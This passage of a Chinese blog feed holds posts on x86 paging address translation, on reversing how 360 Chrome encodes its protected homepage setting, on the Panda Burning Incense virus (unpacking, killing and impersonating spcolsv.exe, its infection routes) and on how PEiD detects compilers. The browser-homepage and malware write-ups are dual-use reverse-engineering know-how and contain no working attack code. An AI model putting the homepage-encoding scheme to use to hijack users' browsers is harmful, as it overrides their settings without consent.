Entry</li></ul><p>这里需要注意的是各种table及entry的描述性数据结构，在实际操作中，其低12bit都置0处理，因为这部分是用来描述页表属性的。</p><h2><span id="地址转换基本原理">地址转换基本原理</span></h2><p>原理很简单，就是讲线性地址拆分，各个域对应不同表，表项的index，然后来一步步定位。随着32bit OS到64bit OS的转变，32bit地址到64位地址的转变，地址转换的层级也就逐步增多，从二级页表(32bit)到三级（PAE），再到4级（64bit）。</p><h2><span id="页转换模型">页转换模型</span></h2><p>IA-32e提供了三种页转换模型：</p><ul><li>4k：PML4t,PDPT,PDT和PT</li><li>2M：PML4T，PDPT和PDT</li><li>1G：PML4T和PDPT</li></ul><p>本文所有分页模式下的转换都是基于4K的寻址方式，因为在个人计算机上，普遍是4K，4K对齐嘛</p><h1><span id="32bit地址">32bit地址</span></h1><p>32bit的线性地址到物理地址转换最简单，是通过二级页表来进行的。此时cr3高20位中存储的是页目录表物理基地址</p><p>具体步骤：</p><ol><li>将32bit地址拆分为三部分：高10位（PDE index），中间10位（PTE index），低12位（物理页offset）</li><li>获取页表的物理基地址：PDE index <em> 4 + cr3中页目录表基地址= </em>PT base addr，通过这个指针即可找到页表的物理基地址</li><li>获取分配到的物理页地址：PTE index * 4 + PT base addr，就可以找到存储物理页地址的页表项</li><li>物理页地址+物理页offset=物理地址</li></ol><p>这里为什么乘以4呢，因为每个entry 4字节大小</p><p><img src="/images/3PagingModeVtoP/4K32NonPAE.PNG" alt="32bit No PAE"></p><p>以未开启PAE的win xp下calc.exe为例，其入口地址为0x1012475，这个地址怎么来的呢，OD载入即可找到。因为没有ASLR，所以每次运行的地址是固定的。将0x1012475分成三部分:</p><ul><li>0x10</li><li>0x12</li><li>0x475</li></ul><p><img src="/images/3PagingModeVtoP/va2ra2.PNG" alt="0x1012475入口特征"></p><p><img src="/images/3PagingModeVtoP/va2ra1.PNG" alt="32bit地址转换过程"><br>根据上面两张图，可以看出物理地址0x145e8375处数据和0x1012475处数据一致</p><p>为了进一步验证是否数据是否一致，在Windbg下修改物理地址处数据，然后通过OD查看虚拟地址处的数据，发现也是一致变化的。<br><img src="/images/3PagingModeVtoP/va2ra3.PNG" alt="Windbg修改数据"></p><h1><span id="开启pae">开启PAE</span></h1><p>此时线性地址要拆分成四部分，高2位（PD index），中高9位（PT index）,中的（PTE index）,低12位（物理页偏移）。此时cr3[5:31]存储的是PDPT base addr。<br><img src="/images/3PagingModeVtoP/PDPTbase.PNG" alt="cr3 PDPT base"></p><p>开启硬件的PAE选项，可以发现XP下多了”物理地址扩展”<br><img src="/images/3PagingModeVtoP/va2ra4.PNG" alt="开启PAE"></p><p>将0x1012475拆分成四部分：</p><ul><li>0x0</li><li>0x8</li><li>0x12</li><li>0x475</li></ul><p>具体转换步骤如下图：<br><img src="/images/3PagingModeVtoP/va2ra5.PNG" alt="PAE下地址转换过程"><br>这里为什么乘以8呢，因为PAE下每个entry 8字节大小</p><h1><span id="ia-32e地址转换">IA-32e地址转换</span></h1><p>此时64bit线性地址要拆分成五部分：</p><ul><li>[51:42] (PML4E index)</li><li>[41:32]（PDPE index）</li><li>[31:22]（PDE index）</li><li>[21:13]（PTE index）</li><li>[12:0]（physical offset）</li></ul><p>此时cr3[5:31]存储的是PML4T base addr。<br><img src="/images/3PagingModeVtoP/PML4TBASE.PNG" alt="cr3 PML4T base"></p><p>用以下这张图可以清晰明了表示：<br><img src="/images/3PagingModeVtoP/1G2M4Kpage.PNG" alt="1G2M4Kpage"></p><p>这里测试写了一段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char szName[20] = &quot;HelloWorld&quot;;</span><br><span class="line">printf(&quot;szName:0x%x\n&quot;, szName);</span><br><span class="line">cout &lt;&lt; &quot;szName:&quot; &lt;&lt; &amp;szName &lt;&lt; endl;</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>为什么这里要写个printf输出呢。因为在看雪论坛上看到一个帖子啊，讲x64位虚拟地址转换，用printf直接输出值，这样是不严谨的，因为printf直接输出的话，只能输出32bit地址，如果是64bit的话，高32bit会被截取掉的。看雪上那篇帖子测试的时候正好输出了32bit的地址，所以可以寻到物理地址。</p><p>这里将szName的地址：0x2f440ff628分成五部分：</p><ul><li>0x0</li><li>0xbd</li><li>0x20</li><li>0xff</li><li>0x628</li></ul><p>具体转换步骤如下图：<br><img src="/images/3PagingModeVtoP/va2ra7.PNG" alt="IA-32e地址转换"><br>同样这里乘以8也是因为每个entry 8字节大小 </p><p>Windbg有一个扩展指令，!vtop可将虚拟地址转换成物理地址，在上图中也有验证。</p><h1><span id="参考链接">参考链接</span></h1><p>启用PAE后虚拟地址到物理地址的转换：<a href="https://bbs.pediy.com/thread-180989.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-180989.htm</a></p><p>X64下的虚拟地址到物理地址的转换：<a href="https://bbs.pediy.com/thread-203391.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-203391.htm</a></p><p>理解 paging：<a href="http://www.mouseos.com/arch/paging.html" target="_blank" rel="external">http://www.mouseos.com/arch/paging.html</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses</a></p><p><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html" target="_blank" rel="external">https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为了更好管理更大的内存，现代操作系统和CPU硬件引入了保护模式。其中保护模式的分页机制通过内存管理单元（MMU，Memory Management Unit）实现了物理地址到线性（虚拟）地址的转换，这个转换过程也称地址翻译。而本文探讨线性地址到物理地址的转换过程，并通过实际
      
    
    </summary>
    
      <category term="kernel" scheme="https://asanzjx.github.io/categories/kernel/"/>
    
    
      <category term="kernel" scheme="https://asanzjx.github.io/tags/kernel/"/>
    
      <category term="Paging" scheme="https://asanzjx.github.io/tags/Paging/"/>
    
  </entry>
  
  <entry>
    <title>记录一次逆向360极速浏览器修改主页设置</title>
    <link href="https://asanzjx.github.io/2017/03/21/360Chrome/"/>
    <id>https://asanzjx.github.io/2017/03/21/360Chrome/</id>
    <published>2017-03-21T14:29:00.000Z</published>
    <updated>2018-05-06T09:52:25.328Z</updated>
    
    <content type="html"><![CDATA[<p>看到FreeBUF上有一篇文章逆向360极速浏览器和360首页设置加密算法，<a href="http://www.freebuf.com/articles/terminal/128902.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/128902.html</a>。当时对这个很感兴趣，想尝试一下。这里在WindowsXP下以360极速浏览器8.5.0.144为例进行分析。</p><h2><span id="从文章中可以获取的信息">从文章中可以获取的信息</span></h2><p>按照文章所说，其设置流程为(这里把要设置的主页记作url)：</p><ol><li><p>计算硬件的机器码的MD5值，此处记为MD5-1</p></li><li><p>将MD5-1与url进行拼接，后计算MD5值，记为MD5-2</p></li><li><p>计算网卡的机器码的MD5值，记为MD-3</p></li><li><p>将MD5-1,MD-2与url拼接，计算base64</p></li></ol><p>然后文章中还可以了解的信息是360极速浏览器设置主页的注册表目录为：software\360chrme\homepage。然后在几个作者发的OD图中可以发现调用了chrome。</p><h2><span id="找到入口线索">找到入口线索</span></h2><p>首先看看chrome是个什么程序。在安装目录中%360Chrome\Chrome\Application\8.7.0.306%中可以发现找到chrome.dll文件，由此可以推断出主程序调用了这个DLL文件。</p><p>还有一个入口线索，上文可知360极速浏览器设置主页的注册表目录，用string或者OD载入360chrome主程序都无法找到这个注册表目录的字符串。而在chrome.dll是可以找到的。</p><p>既然已经查到了字符串是在chrome.dll文件中出现，那就找到运行这个DLL的入口吧。OD载入360chrome.exe主程序，选项-调试选项-事件中勾选中断在新模块(DLL)。F9运行，观察上下文，看是否为chrome.dll程序。OK，程序停在0x1c51161处，这里就是chrome.dll的领空啦。</p><p>取消勾选中断在新模块(DLL)。F8跟踪到第一个返回，然后Alt+F9返回用户代码领空。程序停在了0x417dea地址处。F8继续跟踪可以然后接一个返回直接到了0x4180fa地址处。经过多次分析和跑飞，发现正常的流程应该是跳到0x418ad1处挂断点跑程序，完成对chrome.dll的加载，</p><h2><span id="进入chromedll">进入chrome.dll</span></h2><p>F7进入。这样就来到了0x1c597c4地址处。搜索字符串“Software\360Chrome\Homepage，可以发现在0x1de48df;0x1de48f2;0x1d2e51f地址处有push<br>chrome.03821320指令，而 chrome.03821320存放的就是要搜索的字符串。</p><h3><span id="前两个指令">前两个指令</span></h3><p>Ctrl+G跳转到0x1de48df地址处，0x1de48eb地址处下断点</p><p>在第四个call下断点，运行然后进入。来到了地址0x1de4984地址处。</p><p>在0x1de498b0地址处call了一个打开注册表的函数，这个函数正是打开Homepage\Default这个目录。参数详见栈空间。</p><p>上面的分析没找到什么有关于加密的算法实现。</p><h3><span id="0x1d2e51f">0x1d2e51f</span></h3><p>这样就剩下最后的0x1d2e51f出的地址，挂断点跑程序。</p><p>首先进入第一个call函数分析，0x1d2e52a。</p><p>0x627ee28存放的是360极速浏览器用户数据目录。</p><p>找到下面的第四个函数，发现其调用chrome.0x1d2e57d地址，Ctrl+G转到chrome.0x1d2e57d地址，挂断点跑程序。这个函数要找的设置主页的函数。</p><h2><span id="chrome0x1d2e57d详细分析">chrome.0x1d2e57d详细分析</span></h2><p>首先打开注册表</p><p><img src="/images/360-999.PNG" alt="打开注册表&lt;spandata-label=&quot;360-999&quot;&gt;&lt;/span&gt;"></p><p>如图[360-999]可以发现打开注册表并不是homepage键值，而是urls_to_restore_on_startup键值。</p><p>接着开始得到MD5-1值，进行了第一次拼接[360-998]</p><p><img src="/images/360-998.PNG" alt="得到MD5-1&lt;spandata-label=&quot;360-998&quot;&gt;&lt;/span&gt;"></p><p><img src="/images/360-997.PNG" alt="得到MD5-2&lt;spandata-label=&quot;360-997&quot;&gt;&lt;/span&gt;"></p><p>接着进行第二次拼接操作[360-996],[360-995]</p><p><img src="/images/360-996.PNG" alt="url+MD5-2&lt;spandata-label=&quot;360-996&quot;&gt;&lt;/span&gt;"></p><p><img src="/images/360-995.PNG" alt="url+MD5-2&lt;spandata-label=&quot;360-995&quot;&gt;&lt;/span&gt;"></p><p>进行base64编码[360-994]</p><p><img src="/images/360-994.PNG" alt="&lt;span data-label=&quot;360-994&quot;&gt;&lt;/span&gt;"></p><p>最后设置注册表的操作[360-993]</p><p><img src="/images/360-993.PNG" alt="最后进行注册表的操作&lt;spandata-label=&quot;360-993&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>分析了一圈，可以发现在我的机器上，主要是设置urls_to_restore_on_startup。这个地址其实是我IE的主页url<a href="http://www.msn.com/zh-cn" target="_blank" rel="external">http://www.msn.com/zh-cn</a>。</p><h2><span id="一些发现">一些发现</span></h2><p>当然，这期间的分析过程中是碰到诸多的麻烦，当然也会有一些意外的收获。</p><h3><span id="解析各种文件">解析各种文件</span></h3><p>这段代码主要在chrome.0x1e516dc chrome.0x1e51b06。</p><h3><span id="加载chromedll文件">加载chrome.dll文件</span></h3><p>继续跟踪，发现注释多次提到了chrome.01c50000，数据窗口跟随下，发现是个PE文件，根据其PE文件头中文件属性，可知值是0x2122[]，这样就可以知道是个32位的DLL文件。</p><p><img src="/images/360-PE1.PNG" alt="chrome.01c50000 PE头文件属性&lt;spandata-label=&quot;360-PE1&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>单步进入0x464390。首先会验证是否是PE文件，检查0x5a4d[360-PE2]。</p><p><img src="/images/360-PE2.PNG" alt="chrome.01c50000验证是否为PE文件&lt;spandata-label=&quot;360-PE2&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>而在0x001bb530处则存储了DLL路径数据[360-PE3]。</p><p><img src="/images/360-PE3.PNG" alt="chrome.01c50000路径信息存储位置&lt;spandata-label=&quot;360-PE3&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>当然也会获取关于PE文件内存映像大小[360-PE4]。</p><p><img src="/images/360-PE4.PNG" alt="chrome.01c50000PE文件内存映像大小获取&lt;spandata-label=&quot;360-PE4&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><h3><span id="注册表的homepage值">注册表的homepage值</span></h3><p>OK，既然可以设置注册表位置，更改主页设置，可以找到这几个homepage值</p><pre><code>http://www.msn.com/zh-cn:aHR0cDovL3d3dy5taWNyb3NvZnQuY29tL2lzYXBpL3JlZGlyLmRsbD9wcmQ9aWUmcHZlcj02JmFyPW1zbmhvbWV7MGY4YWFjZmExMzg3ZTNmYzFmMGI1MDUyNmE2NDk0MDh9ezViZWM0NmQ1YzA0Y2ZlYjVkZjkyYjBiMWU1NGJiMjk0fQ==e2ZjMzYwMTE1NTJjNjA2ZjBhNDFkOTg0Nzk5YzkyNjVhfXswMTI5Zjg5NjE3N2Q1ZDVjZWI1MmJjMjU3ZmEyZGZkNn0=https://www.baidu.com/:aHR0cDovL3d3dy5iYWlkdS5jb20vezIzMmMxN2U1OTI0NTY5ZjA1NzIwYjE5YzI3MGYwNWE1fXtmOTgxZmViY2RiMWNhMzdkNGFiODRiZTViNGUxMmFmYX0=</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看到FreeBUF上有一篇文章逆向360极速浏览器和360首页设置加密算法，&lt;a href=&quot;http://www.freebuf.com/articles/terminal/128902.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http:
      
    
    </summary>
    
      <category term="逆向" scheme="https://asanzjx.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="360" scheme="https://asanzjx.github.io/tags/360/"/>
    
      <category term="逆向" scheme="https://asanzjx.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香病毒分析</title>
    <link href="https://asanzjx.github.io/2017/02/26/Panda/"/>
    <id>https://asanzjx.github.io/2017/02/26/Panda/</id>
    <published>2017-02-26T10:53:00.000Z</published>
    <updated>2017-02-26T10:54:23.579Z</updated>
    
    <content type="html"><![CDATA[<p>环境：VMware WindowsXP；OD；IDA 6.8(32bit)；熊猫烧香样本</p><p>先来看看大名鼎鼎的熊猫烧香长什么样子[fig:Panda1_PNG]</p><p><img src="/images/Panda1.PNG" alt="Panda&lt;spandata-label=&quot;fig:Panda1_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>先保存下虚拟机环境，创建一个快照。</p><p>然后拖入IDA中看看。</p><p><img src="/images/Panda2.PNG" alt="IDA警告&lt;spandata-label=&quot;fig:Panda2_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>觉得应该是有壳。放入PEiD中扫扫，果然。</p><p><img src="/images/Panda3.PNG" alt="Panda的壳&lt;spandata-label=&quot;fig:Panda3_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>是一个压缩变形壳FSG 2.0 -&gt;<br>bart/xt。查了下，不是很强的壳，试试手动脱壳。</p><h3><span id="脱fsg-20-gt-bartxt">脱FSG 2.0 -&gt; bart/xt</span></h3><p>拖入OD，显示入口点警告</p><p><img src="/images/Panda4.PNG" alt="Panda的壳2&lt;spandata-label=&quot;fig:Panda4_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>查了下，可用ESP定律法脱壳。</p><p>这里先用脱壳软件UnFSG 2.0脱壳。</p><h3><span id="初步分析">初步分析</span></h3><p>把脱好壳的程序拖入IDA，也同时用OD载入，这样可达到事半功倍的效果。</p><p><img src="/images/Panda5.PNG" alt="Panda OEP处代码&lt;spandata-label=&quot;fig:Panda5_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p><img src="/images/Panda6.PNG" alt="Panda 代码片段分析之校验部分&lt;spandata-label=&quot;fig:Panda6_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>这段代码是程序的校验分析，其中包含了作者以及为作者提供帮助的相关人员的信息。验证成功后，会进入病毒启动部分，根据上图可知在标号loc_40D5FD。</p><p><img src="/images/Panda7.PNG" alt="Panda 代码片段分析之病毒验证和启动&lt;spandata-label=&quot;fig:Panda7_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>这段代码再次验证程序是否为病毒程序，若通过验证，则启动病毒程序，通过三个函数（这三个函数名是手动重命名的）：CreateAndRunPanda；InfectOtherFile、VirusProtect这三个函数完成病毒的运行、感染以及病毒自身的保护，可以说是该病毒的主要功能模块。</p><h3><span id="分析createandrunpanda">分析CreateAndRunPanda</span></h3><p><img src="/images/Panda8.PNG" alt="Panda CreateAndRunPanda片段1&lt;spandata-label=&quot;fig:Panda8_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p><img src="/images/Panda9.PNG" alt="Panda CreateAndRunPanda片段2&lt;spandata-label=&quot;fig:Panda9_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>上述代码主要获取当前路径，并将“Desktop_.ini”拼接到当前路径中，同时检查此文件是否存在，如果文件存在，则将其删除。之后将病毒文件信息读取到内存，接着进行了标记检查工作，以判断病毒程序是否被多次运行，同时设置相关的标记信息。</p><p><img src="/images/Panda10.PNG" alt="Panda CreateAndRunPanda片段3&lt;spandata-label=&quot;fig:Panda10_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p><img src="/images/Panda11.PNG" alt="Panda CreateAndRunPanda片段4&lt;spandata-label=&quot;fig:Panda11_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>上述代码的目的只有一个：找到进程中运行的“spcolsv.exe”并将其终止，在系统目录中删除“spcolsv.exe”，将病毒自身伪造成“spcolsv.exe”并启动，这是病毒第一次运行时需要执行的。</p><h3><span id="运行测试">运行测试</span></h3><p><img src="/images/Panda12.PNG" alt="Panda 运行后的情况&lt;spandata-label=&quot;fig:Panda12_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>运行后因为各种原因，反正没有感染其他文件。这里暂且放下，毕竟年代久远，变数太多。</p><h3><span id="ininfectotherfile">InInfectOtherFile</span></h3><p>这里我们继续分析InfectOtherFile函数。</p><p><img src="/images/Panda13.PNG" alt="Panda 的三种感染方式&lt;spandata-label=&quot;fig:Panda13_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>如图[fig:Panda13_PNG]，此病毒通过3种方式进行感染，前两种是在本地进行病毒的感染，第三种则需要网络的支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;环境：VMware WindowsXP；OD；IDA 6.8(32bit)；熊猫烧香样本&lt;/p&gt;
&lt;p&gt;先来看看大名鼎鼎的熊猫烧香长什么样子[fig:Panda1_PNG]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/Panda1.PNG&quot; alt=&quot;Panda&amp;lt
      
    
    </summary>
    
      <category term="逆向" scheme="https://asanzjx.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://asanzjx.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="病毒" scheme="https://asanzjx.github.io/tags/%E7%97%85%E6%AF%92/"/>
    
      <category term="熊猫烧香" scheme="https://asanzjx.github.io/tags/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"/>
    
  </entry>
  
  <entry>
    <title>PEiD原理分析</title>
    <link href="https://asanzjx.github.io/2017/02/26/PEID/"/>
    <id>https://asanzjx.github.io/2017/02/26/PEID/</id>
    <published>2017-02-26T10:53:00.000Z</published>
    <updated>2017-02-26T10:53:25.768Z</updated>
    
    <content type="html"><![CDATA[<p>环境：Win10；Ollydbg v1.10 dyk158修改版；PEID v0.94；IDA<br>6.8.150423(32-bit)</p><p>首先熟悉PEID的界面及其功能，PEID载入之前用VC++6.0编写的程序</p><p><img src="/images/PEID1.PNG" alt="PEID界面&lt;spandata-label=&quot;fig:PEID1_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>这里我们从字符串“Microsoft Visual C++<br>6.0”入手。为什么要从这入手呢？因为PEID是一个查壳软件，我们得到的这个“Microsoft<br>Visual C++<br>6.0”字符串信息是PEID根据软件的特征侦察出来的。因此找到这个字符串的地址信息，以此来为入口分析PEID的工作原理是一个很好的切入点。<a href="从字符串入手也是逆向和调试软件的常见方法。">^1</a></p><p>OD载入程序，使用字符串参考插件，这里查找ASCII模式的字符串。Ctrl+F查找“Microsoft<br>Visual C++ 6.0”，可能会找到多条信息，z或p查找下一个，b或n查找上一个。</p><p><img src="/images/PEID2.PNG" alt="找到字符串地址&lt;spandata-label=&quot;fig:PEID2_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>找到后，Enter进入，F2下断点。这个地址是0x00438fff,上一行的地址是0x00438ffd，现在我们需要找到调用这个此处的代码在哪（也就是找到需要什么条件才能使PEID判断程序为Microsoft<br>Visual C++<br>6.0），顺藤摸瓜，其实我们可以找到很多处跳转到0x00438ffd的代码，我们以最前面的地址0x00438d13来向上分析，</p><p><img src="/images/PEID3.PNG" alt="调用0x00428ffd的代码IDA和OD分析&lt;spandata-label=&quot;fig:PEID3_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>其有效代码如图[fig:PEID3_PNG]所示，可以看到0x00438c20前面的代码为int3的指令，而且IDA和OD此处的代码并无异同。</p><p><img src="/images/PEID4.PNG" alt="PE节数目位置&lt;spandata-label=&quot;fig:PEID4_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p><img src="/images/PEID5.PNG" alt="节表项&lt;spandata-label=&quot;fig:PEID5_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p><img src="/images/PEID6.PNG" alt="0x00438C2C 0x00438D60分析&lt;spandata-label=&quot;fig:PEID6_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>如图[fig:PEID6_PNG]可以看出，开始就定义了一个很大的数组，并对数组进行了初始化。可以推断出这个数组中存放的数据应该为相关特征码。这段代码主要的做的就是检查OEP是否在“.text”中，若条件成立，则跳转到显示编译器版本的代码处。如果条件不成立，程序会先根据入口特征码比较OEP入口处的8字节机器码，分析目标是否为其他编译器所生成。如果不符合特征，将会调整OEP，加入文件偏移与虚拟地址偏移的转换过程，再次用特征码对比OEP处的机器码。如符合特征，则程序流程进入字符串文本输出部分。</p><p>OK，其实这只是判定过程的结尾，我们继续向上查找调用0x438d13(因为在此地址处是经过分类处理后执行的代码)的程序。</p><p>怎么找调用它的函数呢？根据函数调用机制，函数被调用后会在栈的最顶端压入函数的返回地址，执行到0x438d13查看堆栈窗口，我们可以得到0x00452f46这个地址。</p><p><img src="/images/PEID7.PNG" alt="返回地址分析&lt;spandata-label=&quot;fig:PEID7_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>那么我们就可以推断出0x452f3f这个地址就是调用0x438d13的函数，跟踪进去，跳到0x401E8C处。</p><p><img src="/images/PEID8.PNG" alt="0x401e8c处的部分数组数据&lt;spandata-label=&quot;fig:PEID8_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>0x401e8c这个处保存了大量的数据。</p><p>我们接着向上分析[fig:PEID9_PNG]</p><p><img src="/images/PEID9.PNG" alt="0x00452e90 0x00452f58编译器检查分类函数&lt;spandata-label=&quot;fig:PEID9_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>图[fig:PEID9_PNG]完成了对OEP处特征码的比较并根据比较结果，从函数指针数组中找到符合此特征的处理流程，记录下标值，记录下标值，然后将它们保存在另一个存放下标值的数组中。这时第一次过滤已经完成，进入第二次过滤检查分析程序中是否存在第二个节。</p><p>OK，我们可以继续分析0x0045A3E0查看PEID会将OEP处的哪些机器码作为特征码进行对比。</p><p><img src="/images/PEID10.PNG" alt="特征码校验分析&lt;spandata-label=&quot;fig:PEID10_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>找到重要的比较函数0x0045A1D0，这个函数完成分析程序的机器码与事先准备好的特征码的比较，最终提取出了具有相同特性的编译器的版本。</p><p><img src="/images/PEID11.PNG" alt="VC++6.0特征码&lt;spandata-label=&quot;fig:PEID11_PNG&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p><p>至此我们可以推断出PEID的工作流程：</p><ol><li><p>读取分析文件到内存中，并分析出相关的PE文件的信息，然后保存</p></li><li><p>　检查OEP，计算地址偏移，并修正OEP</p></li><li><p>　再次检查OEP地址的合法性</p></li><li><p>　将OEP处的机器码与特征码进行比较</p></li><li><p>　检查分析文件中是否存在“.rdata”节</p></li><li><p>根据分析结构获取对应处理函数所在数组中的下标并保存</p></li><li><p>循环调用处理函数</p></li><li><p>在处理函数中再次检查</p></li><li><p>显示编译器版本</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;环境：Win10；Ollydbg v1.10 dyk158修改版；PEID v0.94；IDA&lt;br&gt;6.8.150423(32-bit)&lt;/p&gt;
&lt;p&gt;首先熟悉PEID的界面及其功能，PEID载入之前用VC++6.0编写的程序&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imag
      
    
    </summary>
    
      <category term="逆向" scheme="https://asanzjx.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://asanzjx.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="PEid" scheme="https://asanzjx.github.io/tags/PEid/"/>
    
  </entry>
  
  <entry>
    <title>Pandoc</title>
    <link href="https://asanzjx.github.io/2016/08/18/Pandoc/"/>
    <id>https://asanzjx.github.io/2016/08/18/Pandoc/</id>
    <published>2016-08-18T07:54:11.000Z</published>
    <updated>2016-08-18T08:25:05.989Z</updated>
    
    <content type="html"><![CDATA[<p>官网：<a href="http://pandoc.org/" target="_blank" rel="external">http://pandoc.org/</a>，支持转换的格式：<a href="http://pandoc.org/diagram.jpg" target="_blank" rel="external">http://pandoc.org/diagram.jpg</a>。</p><figure class="highlight plain"><figcaption><span>title="常用命令"&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pandoc -o &lt;outputFileName&gt; &lt;inputFileName&gt;</span><br><span class="line"># example</span><br><span class="line">pandoc -o outputfile.md inputfile.tex</span><br></pre></td></tr></table></figure><p>这样就把tex文件转化为md格式的文件，效果还是不错的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;官网：&lt;a href=&quot;http://pandoc.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pandoc.org/&lt;/a&gt;，支持转换的格式：&lt;a href=&quot;http://pandoc.org/diagram.jpg&quot; tar
      
    
    </summary>
    
      <category term="ToolView" scheme="https://asanzjx.github.io/categories/ToolView/"/>
    
    
      <category term="Pandoc" scheme="https://asanzjx.github.io/tags/Pandoc/"/>
    
  </entry>
  
  <entry>
    <title>导出PPT中的图片</title>
    <link href="https://asanzjx.github.io/2016/06/15/%E5%AF%BC%E5%87%BAPPT%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87/"/>
    <id>https://asanzjx.github.io/2016/06/15/导出PPT中的图片/</id>
    <published>2016-06-14T16:01:14.000Z</published>
    <updated>2016-08-17T14:08:23.102Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="problem">Problem：</span></h1><p>需要导出PPT中的图片，一张一张“另存为”效率太低了。</p><h1><span id="try">Try</span></h1><ol><li>确认源文件格式为.pptx，否则用office打开另存为pptx格式；</li><li>直接修改后缀名，改为.rar或者.zip等压缩文件格式；</li><li>解压缩文件，可以得到如图所示的目录结构;</li><li>在ppt/media文件夹即可找到所有导出的图片。</li></ol><p><img src="/images/20160615-1.PNG" alt="目录结构"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;problem&quot;&gt;Problem：&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;需要导出PPT中的图片，一张一张“另存为”效率太低了。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;try&quot;&gt;Try&lt;/span&gt;&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;确认源文件格式为.pptx，否则用of
      
    
    </summary>
    
      <category term="效率" scheme="https://asanzjx.github.io/categories/%E6%95%88%E7%8E%87/"/>
    
    
      <category term="PPT" scheme="https://asanzjx.github.io/tags/PPT/"/>
    
  </entry>
  
  <entry>
    <title>NewBlog</title>
    <link href="https://asanzjx.github.io/2016/05/30/NewBlog/"/>
    <id>https://asanzjx.github.io/2016/05/30/NewBlog/</id>
    <published>2016-05-30T13:09:41.000Z</published>
    <updated>2016-08-18T07:50:34.717Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;我又回来了！<br><br>&emsp;生活逐渐走上正轨，做了一些计划，把文档也重新写起来了，这几天折腾了下把博客也开起来（反正买了三年的域名）。</p>]]></content>
    
    <summary type="html">
    
      
      
